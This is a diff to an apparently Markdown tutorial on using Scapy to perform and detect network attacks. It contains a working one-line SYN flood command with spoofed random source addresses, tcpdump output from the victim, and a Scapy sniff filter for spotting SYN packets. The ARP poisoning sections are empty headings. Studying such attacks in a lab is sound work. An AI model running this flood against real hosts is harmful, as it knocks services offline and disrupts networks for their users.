@@ -23,13 +23,9 @@ The server will wait for the acknowledgement for some time, as simple network co
 ![SYN Flood](http://upload.wikimedia.org/wikipedia/commons/thumb/9/94/Tcp_synflood.png/220px-Tcp_synflood.png)
 
 
-http://www.computrad.co.uk/blog/p.php?e=41
+### 1. Using Scapy for performing attacks.
 
-
-
-### 1. 
-
-#### Using Scapy for performing TCP/SYN Flood.
+###### TCP/SYN Flood.
 
 	send(IP(src=RandIP('10.0.0.0/8'), dst='172.16.16.16')/TCP(sport=RandShort(), dport=80), loop=1) 
 
@@ -55,3 +51,34 @@ On the victim router, we can see that the TCP connection queue is immediately ex
 	02:15:49.025861 IP 10.150.235.34.29320 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
 	02:15:49.027553 IP 10.231.145.11.58377 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
 	02:15:49.029261 IP 10.145.105.136.60844 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
+
+###### ARP Poisoning.
+
+	
+### 2. Using Scapy for detecting attacks.
+
+###### TCP/SYN Flood.
+
+We can easily capture **tcp** packets with **"S" flag**:
+
+
+	a= sniff(filter="tcp[tcpflags] & (tcp-syn) != 0")
+	a.nsummary()
+
+Displayed information:
+	
+	0000 Ether / IP / TCP 10.86.233.36:25701 > 172.16.16.16:www S
+	0001 Ether / IP / TCP 10.155.28.58:56047 > 172.16.16.16:www S
+	0002 Ether / IP / TCP 10.79.88.202:60566 > 172.16.16.16:www S
+	0003 Ether / IP / TCP 10.95.55.197:64929 > 172.16.16.16:www S
+	0004 Ether / IP / TCP 10.177.194.62:1856 > 172.16.16.16:www S
+	0005 Ether / IP / TCP 10.236.101.170:21069 > 172.16.16.16:www S
+	0006 Ether / IP / TCP 10.236.110.58:16205 > 172.16.16.16:www S
+	0007 Ether / IP / TCP 10.40.112.40:63280 > 172.16.16.16:www S
+	0008 Ether / IP / TCP 10.216.122.157:16823 > 172.16.16.16:www S
+	0009 Ether / IP / TCP 10.66.169.3:60749 > 172.16.16.16:www S
+	0010 Ether / IP / TCP 10.61.157.51:48726 > 172.16.16.16:www S
+	0011 Ether / IP / TCP 10.73.11.92:55115 > 172.16.16.16:www S
+	0012 Ether / IP / TCP 10.115.49.253:23161 > 172.16.16.16:www S
+
+###### ARP Poisoning.
